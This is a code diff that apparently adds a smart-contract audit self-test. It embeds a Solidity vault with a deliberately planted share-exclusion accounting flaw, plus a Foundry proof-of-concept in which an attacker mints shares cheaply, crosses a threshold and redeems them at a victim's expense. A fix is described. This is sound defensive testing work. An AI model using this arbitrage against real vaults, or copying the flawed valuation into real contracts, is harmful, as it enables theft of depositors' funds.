@@ -804,3 +804,99 @@ def run_cross_reentrancy_self_test(rpc_url: str, out_dir: Path) -> dict:
         "The attacker receives the ETH AND keeps the credited balance, double-spending the deposit.",
         "Apply checks-effects-interactions in A (settle before the external call) and/or guard every "
         "function touching the shared balance with the SAME nonReentrant lock.")
+
+
+# ---- #6 Vault share-exclusion accounting (SC07, K3 Capital pattern) ----
+_EXCLUSION_SELFTEST = """// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.20;
+import {Test, console2} from "forge-std/Test.sol";
+
+contract MockERC20 {
+    mapping(address => uint256) public balanceOf;
+    mapping(address => mapping(address => uint256)) public allowance;
+    function mint(address to, uint256 a) external { balanceOf[to] += a; }
+    function approve(address s, uint256 a) external returns (bool) { allowance[msg.sender][s] = a; return true; }
+    function transfer(address to, uint256 a) external returns (bool) { balanceOf[msg.sender] -= a; balanceOf[to] += a; return true; }
+    function transferFrom(address f, address to, uint256 a) external returns (bool) {
+        if (allowance[f][msg.sender] != type(uint256).max) allowance[f][msg.sender] -= a;
+        balanceOf[f] -= a; balanceOf[to] += a; return true;
+    }
+}
+
+contract Vault {
+    MockERC20 public asset;
+    uint256 public totalSupply;
+    mapping(address => uint256) public shares;
+    uint256 public excludedAmt;                        // collateral excluded from valuation while < THRESHOLD
+    uint256 constant THRESHOLD = 100 ether;
+    bool public immutable excludes;                    // vuln: conditional exclusion; safe: always counts
+    constructor(MockERC20 a, bool e) { asset = a; excludes = e; }
+    function totalAssets() public view returns (uint256) {
+        uint256 bal = asset.balanceOf(address(this));
+        if (excludes && excludedAmt < THRESHOLD) return bal - excludedAmt;   // understates the vault
+        return bal;
+    }
+    function depositAsVictim(uint256 baseAmt, uint256 excl) external {
+        asset.transferFrom(msg.sender, address(this), baseAmt + excl);
+        excludedAmt = excl;
+        shares[msg.sender] = baseAmt; totalSupply = baseAmt;
+    }
+    function deposit(uint256 amt) external returns (uint256 s) {
+        uint256 ta = totalAssets();
+        s = totalSupply == 0 ? amt : amt * totalSupply / ta;
+        asset.transferFrom(msg.sender, address(this), amt);
+        shares[msg.sender] += s; totalSupply += s;
+    }
+    function pushExcluded(uint256 amt) external {       // crossing THRESHOLD re-includes the excluded collateral
+        asset.transferFrom(msg.sender, address(this), amt);
+        excludedAmt += amt;
+    }
+    function redeem(uint256 s) external returns (uint256 amt) {
+        amt = s * totalAssets() / totalSupply;
+        shares[msg.sender] -= s; totalSupply -= s;
+        asset.transfer(msg.sender, amt);
+    }
+}
+
+contract PoC is Test {
+    uint256 constant EXPECTED_CHAINID = 1;
+    function setUp() public { require(block.chainid == EXPECTED_CHAINID, "fork guard"); }
+    function test_share_exclusion() public {
+        MockERC20 tok = new MockERC20();
+        Vault v = new Vault(tok, __EXCLUDES__);
+        address victim = address(0xBEEF);
+        tok.mint(victim, 199.9 ether);
+        vm.startPrank(victim); tok.approve(address(v), type(uint256).max); v.depositAsVictim(100 ether, 99.9 ether); vm.stopPrank();
+        address attacker = address(0xA11CE);
+        tok.mint(attacker, 200 ether);
+        uint256 bef = tok.balanceOf(attacker);
+        vm.startPrank(attacker);
+        tok.approve(address(v), type(uint256).max);
+        uint256 s = v.deposit(100 ether);              // mint shares while the vault is understated
+        v.pushExcluded(0.1 ether);                     // cross THRESHOLD -> excluded collateral re-included
+        v.redeem(s);                                   // redeem at the corrected (higher) valuation
+        vm.stopPrank();
+        uint256 aft = tok.balanceOf(attacker);
+        console2.log("CHAIN_PROFIT_WEI", int256(aft) - int256(bef));
+        assertGt(aft, bef, "no profit: share-exclusion arbitrage netted nothing");
+    }
+}
+"""
+
+
+def build_exclusion_selftest_sol(vulnerable: bool) -> str:
+    """Share-exclusion self-test: vulnerable (conditional exclusion below threshold) or safe (always counts)."""
+    return _EXCLUSION_SELFTEST.replace("__EXCLUDES__", "true" if vulnerable else "false")
+
+
+def run_exclusion_self_test(rpc_url: str, out_dir: Path) -> dict:
+    return _pattern_selftest(
+        rpc_url, out_dir, "share_exclusion", "selftestexcl", "test_share_exclusion",
+        build_exclusion_selftest_sol,
+        "Vault share-exclusion accounting enables mint-cheap / redeem-dear arbitrage",
+        "totalAssets() excludes collateral while it sits below a threshold, understating the vault. The "
+        "attacker mints shares at the understated valuation, crosses the threshold cheaply to re-include "
+        "the excluded collateral, and redeems at the corrected valuation - capturing the victims' "
+        "previously-excluded collateral.",
+        "Never conditionally exclude collateral from share valuation; value all assets consistently, or lock "
+        "the threshold so it cannot be crossed by a depositor in the same position.")
